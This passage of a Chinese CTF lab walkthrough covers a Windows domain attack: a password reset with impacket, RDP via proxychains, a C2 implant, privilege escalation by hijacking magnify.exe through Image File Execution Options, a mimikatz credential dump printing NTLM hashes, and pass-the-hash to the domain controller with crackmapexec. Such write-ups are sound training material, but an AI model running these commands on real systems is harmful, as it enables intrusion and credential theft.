+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741446240773-bb137f87-a0c6-4990-b0b8-181e6672be95.png"></p>
+<p>登陆的话会过期，这边kalirdp登陆改密码和利用impacket改都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbpasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Calmsec1!&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.46</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741447925599-9ba3f1fa-aa1b-4a14-8662-09aabef0462a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.15 rdp不上</span><br><span class="line">172.22.8.31 登不了</span><br><span class="line">172.22.8.46 成功登录</span><br></pre></td></tr></table></figure>
+
+<p>利用第一台win转发上线一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448063842-2e1fa2df-6c72-4884-8b10-a5ec19dae597.png"></p>
+<p>再用这个监听器，生成个马</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448135705-8c08e0d8-23dd-4cb0-af1d-dcbb1cd1d9e5.png"></p>
+<p>把生成的🐎传到8.46上去</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448228147-a182c7cf-589f-4f6b-b37e-f9d48fb7c722.png"></p>
+<p>运行一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448264695-8356a888-7f2f-45b4-93e7-f57090fa4043.png"></p>
+<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>映像劫持提权，先查看权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448348642-c2c5ed78-479c-4d44-bcfc-35bc9d0c7e15.png"></p>
+<p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448414949-60f9ecb4-bc63-4823-a9d5-771bb3ee383b.png"></p>
+<p>接着锁定</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448467481-3bef3f71-fc9b-42b7-aede-ef0c42ea7634.png"></p>
+<p>点一下放大镜</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448495441-30436640-c5bf-4733-a638-ea73314f06d1.png"></p>
+<p>拿到system</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448511939-73fff185-971f-45cd-b2ed-01dba133f81d.png"></p>
+<p>此时再运行上传的马，拿到system的🐎</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448672587-ff6a7d36-7d89-44b7-b29f-6aaafd4fc075.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
+
+<p>拿到第二个flag</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449116342-55a2b929-81fa-449c-ad59-213b9ac3c716.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line">	 * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win2016$</span><br><span class="line">	 * Domain   : XIAORANG.LAB</span><br><span class="line">	 * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 851871 (00000000:000cff9f)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Aldrich</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Aldrich</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : effdad263995efa4a11f6bc121ef623a</span><br><span class="line">	 * SHA1     : 6691986c4240cf9025618b8c34639c226891b86e</span><br><span class="line">	 * DPAPI    : 5e4bb4bd0e5ffefa26f4c78b6df8c2a2</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Aldrich</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Aldrich</span><br><span class="line">	 * Domain   : XIAORANG.LAB</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 829666 (00000000:000ca8e2)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br><span class="line">	 * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 828954 (00000000:000ca61a)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line">	 * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br><span class="line">	 * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:53</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54890 (00000000:0000d66a)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br><span class="line">	 * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54870 (00000000:0000d656)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line">	 * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : xiaorang.lab</span><br><span class="line">	 * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 25098 (00000000:0000620a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line">	 * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN2016$</span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win2016$</span><br><span class="line">	 * Domain   : XIAORANG.LAB</span><br><span class="line">	 * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\DC01.xiaorang.lab 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Aldrich                  Guest                    </span><br><span class="line">krbtgt                   </span><br><span class="line">命令运行完毕，但发生一个或多个错误</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            WIN2016$                 </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>发现win2016在域管里，dump一下hash直接打pth即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 40af44e61e8174dfa92f90a696be81e8 -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449471016-e7b09fca-8daa-41f8-9f29-432b21f3ddab.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
